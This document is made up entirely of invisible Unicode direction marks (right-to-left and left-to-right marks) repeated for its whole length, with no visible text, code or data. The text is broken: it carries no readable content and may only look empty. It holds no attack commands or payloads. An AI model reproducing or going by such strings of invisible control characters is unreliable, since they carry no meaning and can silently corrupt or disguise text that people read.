‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏